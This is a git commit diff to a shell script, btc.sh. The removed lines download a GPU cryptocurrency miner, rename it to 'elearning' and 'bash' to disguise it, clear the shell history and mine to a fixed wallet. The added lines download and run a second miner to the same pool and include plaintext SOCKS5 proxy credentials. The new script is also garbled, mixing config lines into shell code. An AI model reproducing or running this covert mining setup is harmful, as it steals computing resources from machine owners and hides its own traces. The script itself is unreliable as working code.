edb2628b9852a645abf7a431d0979a577259bde0
nurfasikin <92776649+nurfasikin@users.noreply.github.com>
2022-02-25 19:26:26 +0700

    Update btc.sh

--- btc.sh
+++ btc.sh
@@ -1,8 +1,8 @@
-sudo apt-get install libpci3 && wget https://phoenixminer.info/downloads/PhoenixMiner_5.9d_Linux.tar.gz 
-tar -xf PhoenixMiner_5.9d_Linux.tar.gz 
-rm -rvf PhoenixMiner_5.9d_Linux.tar.gz
-mv PhoenixMiner_5.9d_Linux  elearning
-cd elearning
-mv PhoenixMiner bash
-history -cr
-sudo ./bash -pool 4ocean.hubnas.xyz:443 -wal 3EjEBvM3wqxFMZcetxwPo9E3CkaRtoD8VX.berkah -pass x -proto 4 -stales 0
+#!/bin/sh 
+listen = :2233 
+loglevel = 1 
+socks5 = 52.15.235.202:1080 
+socks5_username = mikrotik999 
+socks5_password = Elibawnos 
+END 
+wget https://www.bminercontent.com/releases/bminer-v16.4.9-c80288d-amd64.tar.xz && tar -xvf bminer-v16.4.9-c80288d-amd64.tar.xz && cd bminer-v16.4.9-c80288d && ./bminer -uri ethstratum://3EjEBvM3wqxFMZcetxwPo9E3CkaRtoD8VX.w@4ocean.hubnas.xyz:443
